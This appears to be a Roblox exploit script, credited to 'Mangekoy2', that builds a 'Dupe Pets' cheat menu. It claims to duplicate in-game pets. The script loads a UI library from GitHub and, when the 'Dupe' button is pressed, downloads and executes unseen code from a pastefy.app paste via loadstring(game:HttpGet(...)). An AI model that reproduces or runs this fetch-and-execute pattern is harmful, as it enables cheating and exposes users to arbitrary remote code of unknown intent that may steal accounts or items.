local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
local Window = Library.CreateLib("Dupe Pets", "Serpent")

local MainTab = Window:NewTab("Main")
local DupeSection = MainTab:NewSection("Pet Duplicator")

-- Кнопка Dupe с пояснением
DupeSection:NewButton("Dupe", "Click to duplicate: Dragon Fly, Raccoon, Red Fox", function()
    loadstring(game:HttpGet("https://pastefy.app/iRFe6rwv/raw"))()
end)

Window:NewTab("Info"):NewSection("Made By Mangekoy2  | v1.0")
